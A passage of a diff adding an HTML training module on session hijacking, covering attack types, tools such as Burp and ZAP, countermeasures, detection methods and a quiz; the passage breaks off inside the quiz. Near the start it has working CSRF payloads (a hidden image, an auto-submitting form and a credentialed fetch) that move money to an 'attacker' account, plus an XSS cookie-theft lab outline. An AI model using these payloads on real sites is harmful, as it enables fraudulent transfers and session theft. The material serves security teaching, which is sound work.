+&lt;img src="http://bank.com/transfer?amount=1000&amp;to=attacker" width="0" height="0"&gt;
+
+&lt;!-- Form-based CSRF --&gt;
+&lt;form action="http://bank.com/transfer" method="POST" id="csrf"&gt;
+    &lt;input type="hidden" name="amount" value="1000"&gt;
+    &lt;input type="hidden" name="to" value="attacker"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('csrf').submit();&lt;/script&gt;
+
+&lt;!-- AJAX CSRF --&gt;
+&lt;script&gt;
+fetch('http://bank.com/api/transfer', {
+    method: 'POST',
+    credentials: 'include',
+    body: JSON.stringify({amount: 1000, to: 'attacker'})
+});
+&lt;/script&gt;
+                        </pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🕷️ Man-in-the-Browser Attacks</h3>
+                    <p>MITB attacks involve malware that runs within the browser, intercepting and modifying communications between the user and web applications in real-time.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>🦠 Browser Malware</h4>
+                            <p>Browser extensions, plugins, or injected code that monitors all web traffic</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Form grabbers</li>
+                                <li>Certificate manipulation</li>
+                                <li>SSL bypass</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card">
+                            <h4>🎭 Session Manipulation</h4>
+                            <p>Real-time modification of requests and responses to achieve attack objectives</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Transaction modification</li>
+                                <li>Content injection</li>
+                                <li>Authentication bypass</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>⚠️ MITB Capabilities</h4>
+                        <ul>
+                            <li><strong>Credential Harvesting:</strong> Capture login credentials in real-time</li>
+                            <li><strong>Session Token Theft:</strong> Extract authentication tokens automatically</li>
+                            <li><strong>Transaction Modification:</strong> Alter financial transactions</li>
+                            <li><strong>Two-Factor Bypass:</strong> Intercept and replay 2FA tokens</li>
+                            <li><strong>Certificate Spoofing:</strong> Present fake SSL certificates</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="lab-exercise">
+                    <h4>🧪 Application Hijacking Lab</h4>
+                    <p><strong>Scenario:</strong> Exploit XSS vulnerability to steal session cookies</p>
+                    <p><strong>Tools:</strong> Burp Suite, OWASP WebGoat, Browser Developer Tools</p>
+                    <p><strong>Steps:</strong></p>
+                    <ol>
+                        <li>Identify XSS vulnerability in target application</li>
+                        <li>Craft JavaScript payload to steal cookies</li>
+                        <li>Set up malicious server to collect stolen data</li>
+                        <li>Execute payload and capture session tokens</li>
+                        <li>Use stolen tokens to hijack victim session</li>
+                    </ol>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('tools')">Next: Tools & Techniques →</button>
+            </div>
+
+            <!-- Tools Section -->
+            <div id="tools" class="module-section">
+                <h2 class="section-title">🔧 Session Hijacking Tools & Techniques</h2>
+
+                <div class="card">
+                    <h3>🕷️ OWASP ZAP (Zed Attack Proxy)</h3>
+                    <p>ZAP is a comprehensive web security testing tool that includes powerful session hijacking capabilities for ethical hacking and penetration testing.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🔍 Session Analysis</h4>
+                            <p>Analyze session token patterns, randomness, and predictability using ZAP's built-in analyzers</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🎯 Proxy Interception</h4>
+                            <p>Intercept and modify HTTP requests to manipulate session tokens in real-time</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🤖 Automated Scanning</h4>
+                            <p>Detect session management vulnerabilities using ZAP's spider and active scanner</p>
+                        </div>
+                        <div class="tool-card">
+                            <h4>🔄 Session Fixation Testing</h4>
+                            <p>Test applications for session fixation vulnerabilities and weak session handling</p>
+                        </div>
+                    </div>
+
+                    <div class="info-box">
+                        <h4>🛠️ ZAP Session Hijacking Workflow</h4>
+                        <ol class="technique-steps">
+                            <li><strong>Proxy Configuration:</strong> Configure browser to route traffic through ZAP</li>
+                            <li><strong>Traffic Capture:</strong> Monitor and capture session-related HTTP traffic</li>
+                            <li><strong>Session Token Analysis:</strong> Examine session IDs for weak patterns</li>
+                            <li><strong>Manual Testing:</strong> Use interceptor to modify session tokens</li>
+                            <li><strong>Automated Exploitation:</strong> Leverage ZAP scripts for session attacks</li>
+                            <li><strong>Report Generation:</strong> Document findings and vulnerabilities</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔓 Burp Suite Professional</h3>
+                    <p>Burp Suite is the industry-standard web application security testing platform with advanced session manipulation capabilities.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="background: var(--gradient-primary);">
+                            <h4>🔄 Sequencer Module</h4>
+                            <p>Analyze session token randomness and entropy</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Statistical analysis</li>
+                                <li>Pattern detection</li>
+                                <li>Predictability assessment</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-secondary);">
+                            <h4>🎯 Intruder Tool</h4>
+                            <p>Automated session token brute-forcing</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Token enumeration</li>
+                                <li>Session guessing</li>
+                                <li>Payload customization</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-success);">
+                            <h4>🔁 Repeater Function</h4>
+                            <p>Manual session manipulation and testing</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Request modification</li>
+                                <li>Response analysis</li>
+                                <li>Session validation</li>
+                            </ul>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>🔧 Burp Suite Session Handling</h4>
+                        <p>Burp Suite provides advanced session handling rules that can automatically:</p>
+                        <ul>
+                            <li>Extract session tokens from responses</li>
+                            <li>Update session cookies across requests</li>
+                            <li>Handle multi-step authentication flows</li>
+                            <li>Maintain persistent sessions during testing</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🦈 Wireshark for Session Analysis</h3>
+                    <p>Wireshark enables deep packet inspection to analyze session establishment, token transmission, and potential vulnerabilities.</p>
+                    
+                    <div class="info-box">
+                        <h4>📊 Wireshark Session Analysis Techniques</h4>
+                        <ul class="technique-steps">
+                            <li><strong>HTTP Stream Following:</strong> Track complete HTTP conversations</li>
+                            <li><strong>Cookie Extraction:</strong> Filter and extract session cookies from traffic</li>
+                            <li><strong>SSL/TLS Inspection:</strong> Analyze encrypted session establishment</li>
+                            <li><strong>Sequence Number Analysis:</strong> Track TCP sequence numbers for hijacking</li>
+                            <li><strong>Protocol Anomaly Detection:</strong> Identify unusual session behaviors</li>
+                        </ul>
+                    </div>
+
+                    <div style="background: rgba(52, 152, 219, 0.1); padding: 20px; border-radius: 10px; margin: 20px 0;">
+                        <h4>🔍 Key Wireshark Filters for Session Analysis</h4>
+                        <pre style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; color: #fff; font-size: 0.8rem;">
+# HTTP Cookie Analysis
+http.cookie contains "JSESSIONID"
+http.cookie contains "PHPSESSID"
+
+# Session Token Patterns
+http.request.uri contains "sessionid"
+http.request.uri contains "token"
+
+# SSL/TLS Handshake Analysis
+ssl.handshake.type == 1
+tls.handshake.type == 2
+
+# TCP Session Tracking
+tcp.stream eq 0
+tcp.flags.syn == 1 && tcp.flags.ack == 1
+                        </pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🐍 Custom Scripts and Automation</h3>
+                    <p>Advanced session hijacking often requires custom tools and automation scripts for specific attack scenarios.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🐍 Python Scripts</h4>
+                            <p>Requests, Scapy, Selenium for session manipulation</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Session token generation testing</li>
+                                <li>Automated cookie theft</li>
+                                <li>Custom payload delivery</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>📱 Browser Extensions</h4>
+                            <p>Custom extensions for session monitoring</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Cookie manipulation</li>
+                                <li>Request interception</li>
+                                <li>Session state tracking</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>🔧 Framework Tools</h4>
+                            <p>Metasploit, BeEF, Social Engineer Toolkit</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Browser exploitation</li>
+                                <li>Session management modules</li>
+                                <li>Automated attack frameworks</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📱 Specialized Mobile Tools</h3>
+                    <p>Mobile applications require specialized tools for session analysis and manipulation.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card">
+                            <h4>📱 DroidSheep</h4>
+                            <p>Android tool for session hijacking on wireless networks</p>
+                        </div>
+                        
+                        <div class="attack-card">
+                            <h4>🔧 FaceNiff</h4>
+                            <p>Session sniffing for social media applications</p>
+                        </div>
+                        
+                        <div class="attack-card">
+                            <h4>🕸️ WebScarab</h4>
+                            <p>Framework for analyzing HTTP/HTTPS applications</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="lab-exercise">
+                    <h4>🧪 Tool Mastery Laboratory</h4>
+                    <p><strong>Objective:</strong> Master multiple session hijacking tools in practical scenarios</p>
+                    <p><strong>Lab Components:</strong></p>
+                    <ul>
+                        <li>ZAP proxy configuration and session analysis</li>
+                        <li>Burp Suite token randomness testing</li>
+                        <li>Wireshark packet capture and analysis</li>
+                        <li>Custom Python script development</li>
+                        <li>Cross-tool integration workflows</li>
+                    </ul>
+                    <div style="background: rgba(39, 174, 96, 0.2); padding: 15px; border-radius: 8px; margin: 10px 0;">
+                        <strong>🎯 Success Criteria:</strong> Successfully demonstrate session token extraction and replay using at least three different tools.
+                    </div>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('countermeasures')">Next: Countermeasures →</button>
+            </div>
+
+            <!-- Countermeasures Section -->
+            <div id="countermeasures" class="module-section">
+                <h2 class="section-title">🛡️ Session Hijacking Countermeasures</h2>
+
+                <div class="card">
+                    <h3>🔐 Secure Session Token Generation</h3>
+                    <p>The foundation of session security lies in generating unpredictable, high-entropy session tokens that cannot be easily guessed or predicted by attackers.</p>
+                    
+                    <div class="countermeasure-list">
+                        <div class="countermeasure-item">
+                            <h4>🎲 Cryptographic Randomness</h4>
+                            <p>Use cryptographically secure random number generators</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Minimum 128 bits entropy</li>
+                                <li>Unpredictable algorithms</li>
+                                <li>Regular entropy pool refresh</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="countermeasure-item">
+                            <h4>📏 Sufficient Length</h4>
+                            <p>Session tokens must be long enough to prevent brute force</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Minimum 32 characters</li>
+                                <li>Complex character sets</li>
+                                <li>No predictable patterns</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="countermeasure-item">
+                            <h4>🔄 Token Regeneration</h4>
+                            <p>Generate new session IDs at critical points</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>After authentication</li>
+                                <li>Privilege level changes</li>
+                                <li>Regular intervals</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🍪 Secure Cookie Configuration</h3>
+                    <p>Proper cookie security attributes are essential for protecting session tokens from various attack vectors.</p>
+                    
+                    <div class="info-box">
+                        <h4>🔧 Essential Cookie Attributes</h4>
+                        <div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(300px, 1fr)); gap: 20px; margin: 20px 0;">
+                            <div style="background: rgba(52, 152, 219, 0.1); padding: 20px; border-radius: 10px;">
+                                <h5>🔒 Secure Flag</h5>
+                                <p><strong>Purpose:</strong> Ensures cookies are only transmitted over HTTPS</p>
+                                <code style="display: block; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin: 10px 0;">
+                                    Set-Cookie: SESSIONID=abc123; Secure
+                                </code>
+                                <p><strong>Protection:</strong> Prevents interception over unencrypted connections</p>
+                            </div>
+                            
+                            <div style="background: rgba(142, 68, 173, 0.1); padding: 20px; border-radius: 10px;">
+                                <h5>🚫 HttpOnly Flag</h5>
+                                <p><strong>Purpose:</strong> Prevents JavaScript access to cookies</p>
+                                <code style="display: block; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin: 10px 0;">
+                                    Set-Cookie: SESSIONID=abc123; HttpOnly
+                                </code>
+                                <p><strong>Protection:</strong> Mitigates XSS-based session token theft</p>
+                            </div>
+                            
+                            <div style="background: rgba(39, 174, 96, 0.1); padding: 20px; border-radius: 10px;">
+                                <h5>🌐 SameSite Attribute</h5>
+                                <p><strong>Purpose:</strong> Controls cross-site cookie transmission</p>
+                                <code style="display: block; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin: 10px 0;">
+                                    Set-Cookie: SESSIONID=abc123; SameSite=Strict
+                                </code>
+                                <p><strong>Protection:</strong> Prevents CSRF and cross-site attacks</p>
+                            </div>
+                            
+                            <div style="background: rgba(231, 76, 60, 0.1); padding: 20px; border-radius: 10px;">
+                                <h5>⏰ Expires/Max-Age</h5>
+                                <p><strong>Purpose:</strong> Controls session lifetime</p>
+                                <code style="display: block; background: rgba(0,0,0,0.2); padding: 10px; border-radius: 5px; margin: 10px 0;">
+                                    Set-Cookie: SESSIONID=abc123; Max-Age=3600
+                                </code>
+                                <p><strong>Protection:</strong> Limits session exposure window</p>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>🔧 Complete Secure Cookie Example</h4>
+                        <pre style="background: rgba(0,0,0,0.3); padding: 15px; border-radius: 8px; color: #fff; font-size: 0.9rem;">
+Set-Cookie: SESSIONID=a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6; 
+            Secure; 
+            HttpOnly; 
+            SameSite=Strict; 
+            Path=/; 
+            Max-Age=3600</pre>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔐 Transport Layer Security</h3>
+                    <p>Implementing robust encryption and secure communication protocols is essential for protecting session data in transit.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🛡️ HTTPS Enforcement</h4>
+                            <p>Mandatory HTTPS for all session-related communications</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>TLS 1.3 preferred</li>
+                                <li>Strong cipher suites</li>
+                                <li>HSTS headers</li>
+                                <li>Certificate pinning</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>🔒 Perfect Forward Secrecy</h4>
+                            <p>Ensure session confidentiality even if long-term keys are compromised</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Ephemeral key exchange</li>
+                                <li>DHE/ECDHE ciphers</li>
+                                <li>Key rotation policies</li>
+                                <li>Session key isolation</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>📋 Certificate Management</h4>
+                            <p>Proper SSL/TLS certificate deployment and validation</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Valid certificate chains</li>
+                                <li>Certificate transparency</li>
+                                <li>OCSP stapling</li>
+                                <li>Regular renewal cycles</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🎯 Session Fixation Prevention</h3>
+                    <p>Implementing proper session lifecycle management prevents attackers from fixing session identifiers.</p>
+                    
+                    <ol class="technique-steps">
+                        <li><strong>Session Regeneration:</strong> Generate new session ID after successful authentication</li>
+                        <li><strong>Pre-Authentication Validation:</strong> Reject pre-set session identifiers</li>
+                        <li><strong>Privilege Level Changes:</strong> Regenerate sessions when user privileges change</li>
+                        <li><strong>Session Invalidation:</strong> Properly destroy sessions on logout</li>
+                        <li><strong>Concurrent Session Limits:</strong> Limit number of active sessions per user</li>
+                        <li><strong>Suspicious Activity Detection:</strong> Monitor for session fixation attempts</li>
+                    </ol>
+                </div>
+
+                <div class="card">
+                    <h3>🛡️ Anti-CSRF Protection</h3>
+                    <p>Cross-Site Request Forgery protection mechanisms prevent unauthorized actions on behalf of authenticated users.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="background: var(--gradient-primary);">
+                            <h4>🎫 CSRF Tokens</h4>
+                            <p>Synchronizer token pattern</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Unique per-request tokens</li>
+                                <li>Server-side validation</li>
+                                <li>Hidden form fields</li>
+                                <li>AJAX header inclusion</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-secondary);">
+                            <h4>🔍 Origin Validation</h4>
+                            <p>Verify request origin headers</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Referer header checking</li>
+                                <li>Origin header validation</li>
+                                <li>Whitelist trusted domains</li>
+                                <li>Custom header requirements</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-success);">
+                            <h4>🍪 SameSite Cookies</h4>
+                            <p>Browser-level CSRF protection</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Strict mode</li>
+                                <li>Lax mode for navigation</li>
+                                <li>None for cross-site</li>
+                                <li>Fallback mechanisms</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>⏱️ Session Timeout Management</h3>
+                    <p>Proper session timeout policies limit the window of opportunity for session hijacking attacks.</p>
+                    
+                    <div class="countermeasure-list">
+                        <div class="countermeasure-item">
+                            <h4>🕒 Idle Timeout</h4>
+                            <p>Automatic logout after inactivity</p>
+                            <ul style="text-align: left;">
+                                <li>15-30 minutes for sensitive apps</li>
+                                <li>User activity tracking</li>
+                                <li>Grace period warnings</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="countermeasure-item">
+                            <h4>⏰ Absolute Timeout</h4>
+                            <p>Maximum session duration</p>
+                            <ul style="text-align: left;">
+                                <li>8-12 hours maximum</li>
+                                <li>Re-authentication required</li>
+                                <li>Privilege-based limits</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="countermeasure-item">
+                            <h4>🔄 Concurrent Sessions</h4>
+                            <p>Limit active sessions per user</p>
+                            <ul style="text-align: left;">
+                                <li>Single session enforcement</li>
+                                <li>Device-based tracking</li>
+                                <li>Notification systems</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="warning-box">
+                    <h4>🏗️ Secure Development Practices</h4>
+                    <ul>
+                        <li><strong>Session Framework Usage:</strong> Use proven session management libraries</li>
+                        <li><strong>Security Testing:</strong> Regular penetration testing and code reviews</li>
+                        <li><strong>Input Validation:</strong> Strict validation of all session-related inputs</li>
+                        <li><strong>Error Handling:</strong> Secure error messages that don't leak session information</li>
+                        <li><strong>Logging & Monitoring:</strong> Comprehensive session activity logging</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-success" onclick="showSection('detection')">Next: Detection Methods →</button>
+            </div>
+
+            <!-- Detection Methods Section -->
+            <div id="detection" class="module-section">
+                <h2 class="section-title">👁️ Session Hijacking Detection Methods</h2>
+
+                <div class="card">
+                    <h3>📊 Behavioral Analysis & Anomaly Detection</h3>
+                    <p>Advanced session hijacking detection relies on identifying anomalous patterns in user behavior and session characteristics.</p>
+                    
+                    <div class="tools-grid">
+                        <div class="tool-card">
+                            <h4>🌍 Geolocation Monitoring</h4>
+                            <p>Track session access from unusual locations</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>IP geolocation analysis</li>
+                                <li>Impossible travel detection</li>
+                                <li>VPN/proxy identification</li>
+                                <li>Country-based restrictions</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>⏰ Temporal Pattern Analysis</h4>
+                            <p>Analyze session timing and access patterns</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Unusual login times</li>
+                                <li>Rapid session switches</li>
+                                <li>Concurrent session detection</li>
+                                <li>Activity burst analysis</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>🖥️ Device Fingerprinting</h4>
+                            <p>Track session consistency across devices</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Browser fingerprinting</li>
+                                <li>OS characteristics</li>
+                                <li>Screen resolution patterns</li>
+                                <li>Plugin and font analysis</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="tool-card">
+                            <h4>🎯 Behavioral Biometrics</h4>
+                            <p>Analyze user interaction patterns</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Typing patterns</li>
+                                <li>Mouse movement analysis</li>
+                                <li>Navigation behavior</li>
+                                <li>Click frequency patterns</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🔍 Technical Detection Mechanisms</h3>
+                    <p>Implement technical controls to detect session hijacking attempts through various attack vectors.</p>
+                    
+                    <div class="info-box">
+                        <h4>🛡️ Session Token Validation</h4>
+                        <ol class="technique-steps">
+                            <li><strong>Token Binding:</strong> Bind sessions to client certificates or other unique identifiers</li>
+                            <li><strong>IP Address Validation:</strong> Monitor for sudden IP address changes within sessions</li>
+                            <li><strong>User-Agent Consistency:</strong> Track browser and device consistency</li>
+                            <li><strong>Session Entropy Monitoring:</strong> Detect unusual session token patterns</li>
+                            <li><strong>Concurrent Access Detection:</strong> Identify simultaneous access from different locations</li>
+                            <li><strong>Session State Validation:</strong> Verify session state consistency</li>
+                        </ol>
+                    </div>
+
+                    <div class="warning-box">
+                        <h4>⚡ Real-Time Detection Indicators</h4>
+                        <ul>
+                            <li><strong>Rapid Credential Changes:</strong> Password, email, or security question changes</li>
+                            <li><strong>Unusual Transaction Patterns:</strong> High-value or out-of-pattern transactions</li>
+                            <li><strong>Administrative Actions:</strong> Privilege escalation attempts</li>
+                            <li><strong>Data Exfiltration Patterns:</strong> Large data downloads or exports</li>
+                            <li><strong>Session Fixation Attempts:</strong> Pre-authentication session manipulation</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>📈 Monitoring and Logging Strategies</h3>
+                    <p>Comprehensive logging and monitoring provide the foundation for effective session hijacking detection.</p>
+                    
+                    <div class="attack-grid">
+                        <div class="attack-card" style="background: var(--gradient-primary);">
+                            <h4>📝 Session Event Logging</h4>
+                            <p>Comprehensive session lifecycle tracking</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Session creation/destruction</li>
+                                <li>Authentication events</li>
+                                <li>Privilege changes</li>
+                                <li>Timeout occurrences</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-secondary);">
+                            <h4>🌐 Network Traffic Analysis</h4>
+                            <p>Monitor network-level session indicators</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>TCP connection patterns</li>
+                                <li>SSL/TLS handshake analysis</li>
+                                <li>HTTP header anomalies</li>
+                                <li>Packet timing analysis</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="attack-card" style="background: var(--gradient-success);">
+                            <h4>🔔 Alert Generation</h4>
+                            <p>Intelligent alerting for suspicious activities</p>
+                            <ul style="text-align: left; margin-top: 10px;">
+                                <li>Threshold-based alerts</li>
+                                <li>Machine learning detection</li>
+                                <li>Correlation rules</li>
+                                <li>Escalation procedures</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🤖 AI-Powered Detection Systems</h3>
+                    <p>Modern session hijacking detection leverages artificial intelligence and machine learning for advanced threat detection.</p>
+                    
+                    <div class="countermeasure-list">
+                        <div class="countermeasure-item">
+                            <h4>🧠 Machine Learning Models</h4>
+                            <p>AI-based behavioral analysis</p>
+                            <ul style="text-align: left;">
+                                <li>User behavior profiling</li>
+                                <li>Anomaly detection algorithms</li>
+                                <li>Pattern recognition</li>
+                                <li>Predictive analysis</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="countermeasure-item">
+                            <h4>📊 Statistical Analysis</h4>
+                            <p>Advanced statistical detection</p>
+                            <ul style="text-align: left;">
+                                <li>Baseline establishment</li>
+                                <li>Deviation measurement</li>
+                                <li>Confidence intervals</li>
+                                <li>Risk scoring</li>
+                            </ul>
+                        </div>
+                        
+                        <div class="countermeasure-item">
+                            <h4>🔄 Adaptive Learning</h4>
+                            <p>Self-improving detection systems</p>
+                            <ul style="text-align: left;">
+                                <li>Continuous model updates</li>
+                                <li>False positive reduction</li>
+                                <li>Attack pattern learning</li>
+                                <li>Feedback integration</li>
+                            </ul>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="card">
+                    <h3>🚨 Incident Response for Session Hijacking</h3>
+                    <p>When session hijacking is detected, rapid response procedures minimize damage and restore security.</p>
+                    
+                    <div class="info-box">
+                        <h4>🔥 Immediate Response Actions</h4>
+                        <ol class="technique-steps">
+                            <li><strong>Session Termination:</strong> Immediately invalidate all potentially compromised sessions</li>
+                            <li><strong>Account Lockdown:</strong> Temporarily suspend affected user accounts</li>
+                            <li><strong>Evidence Preservation:</strong> Capture logs and forensic evidence</li>
+                            <li><strong>Impact Assessment:</strong> Evaluate scope and extent of compromise</li>
+                            <li><strong>Communication:</strong> Notify stakeholders and affected users</li>
+                            <li><strong>Containment:</strong> Prevent further unauthorized access</li>
+                            <li><strong>Recovery:</strong> Restore normal operations with enhanced security</li>
+                            <li><strong>Lessons Learned:</strong> Update procedures and defenses</li>
+                        </ol>
+                    </div>
+                </div>
+
+                <div class="lab-exercise">
+                    <h4>🧪 Detection System Laboratory</h4>
+                    <p><strong>Scenario:</strong> Configure and test session hijacking detection mechanisms</p>
+                    <p><strong>Components:</strong></p>
+                    <ul>
+                        <li>SIEM system configuration for session monitoring</li>
+                        <li>Behavioral analysis rule development</li>
+                        <li>Alert correlation and response procedures</li>
+                        <li>Machine learning model training for anomaly detection</li>
+                        <li>Incident response simulation and testing</li>
+                    </ul>
+                </div>
+
+                <button class="btn btn-primary" onclick="showSection('quiz')">Next: Assessment →</button>
+            </div>
+
+            <!-- Quiz Section -->
+            <div id="quiz" class="module-section">
+                <h2 class="section-title">📝 Module 11 Assessment</h2>
+                
+                <div class="card">
+                    <h3>🎯 Session Hijacking Mastery Test</h3>
+                    <p>This comprehensive assessment covers all major topics from Module 11. Test your understanding of session hijacking attacks, tools, and countermeasures.</p>
+                
+                    <div style="background: linear-gradient(135deg, rgba(52, 152, 219, 0.1), rgba(41, 128, 185, 0.1)); padding: 15px; border-radius: 8px; margin: 15px 0;">
+                        <strong>Assessment Details:</strong>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>20 multiple-choice questions</li>
+                            <li>Passing score: 80% (16/20 correct)</li>
+                            <li>Time limit: 40 minutes</li>
+                            <li>Covers all Module 11 topics</li>
+                        </ul>
+                    </div>
+                </div>
+
+                <div class="quiz-container" id="quizContainer">
+                    <!-- Quiz questions will be populated by JavaScript -->
+                </div>
+
+                <div class="card" id="quizResults" style="display: none;">
+                    <h3>📊 Assessment Results</h3>
+                    <div id="resultsContent">
+                        <!-- Results will be populated by JavaScript -->
+                    </div>
+                </div>
+
+                <button class="btn btn-success" onclick="startQuiz()">Start Assessment</button>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal for detailed information -->
+    <div id="detailModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <div id="modalContent"></div>
+        </div>
+    </div>
+
+    <script>
+        // Global variables
+        let currentSection = 'overview';
+        let completedSections = new Set();
+        let sectionOrder = ['overview', 'fundamentals', 'attack-types', 'network-hijacking', 'application-hijacking', 'tools', 'countermeasures', 'detection', 'quiz'];
+        let quizAnswers = {};
+        let quizScore = 0;
+        let startTime = Date.now();
+        let totalStudyTime = 0;
+        let quizStartTime = 0;
+        let currentQuestionIndex = 0;
+
+        // Quiz questions database
+        const quizQuestions = [
+            {
+                question: "What is the primary difference between passive and active session hijacking?",
+                options: [
+                    "Passive hijacking observes and steals tokens, active hijacking manipulates sessions in real-time",
+                    "Passive hijacking is easier to detect than active hijacking",
+                    "Active hijacking only works over encrypted connections",
+                    "There is no significant difference between the two approaches"
+                ],
+                correct: 0,
+                explanation: "Passive session hijacking involves observing and stealing session tokens without interfering with the session, while active hijacking directly manipulates and takes control of active sessions in real-time."
+            },
+            {
+                question: "Which HTTP cookie attribute prevents JavaScript access to session cookies?",
+                options: [
+                    "Secure",
+                    "SameSite",
+                    "HttpOnly",
+                    "Path"
+                ],
+                correct: 2,
+                explanation: "The HttpOnly attribute prevents client-side scripts from accessing cookies via document.cookie, which helps mitigate XSS-based session token theft."
+            },
+            {
+                question: "In TCP session hijacking, what must an attacker predict to successfully inject packets?",
+                options: [
+                    "The victim's password",
+                    "TCP sequence and acknowledgment numbers",
+                    "The server's private key",
+                    "The session timeout value"
+                ],
+                correct: 1,
+                explanation: "TCP session hijacking requires predicting the correct sequence and acknowledgment numbers to inject packets that will be accepted by the target system as part of the legitimate session."
+            },
+            {
+                question: "What is session fixation?",
+                options: [
+                    "A technique to extend session timeouts",
+                    "A method to force users to use predetermined session IDs",
+                    "A way to fix broken session management code",
+                    "A process to validate session tokens"
+                ],
+                correct: 1,
+                explanation: "Session fixation is an attack where the attacker forces a victim to use a predetermined session ID, then uses that same ID to hijack the victim's authenticated session."
+            },
+            {
+                question: "Which tool is specifically designed for analyzing session token randomness?",
+                options: [
+                    "Wireshark",
+                    "Burp Suite Sequencer",
+                    "OWASP ZAP Spider",
+                    "Ettercap"
+                ],
+                correct: 1,
+                explanation: "Burp Suite's Sequencer tool is specifically designed to analyze the randomness and entropy of session tokens to identify predictable patterns that could be exploited."
+            },
+            {
+                question: "What is the minimum recommended entropy for secure session tokens?",
+                options: [
+                    "64 bits",
+                    "96 bits",
+                    "128 bits",
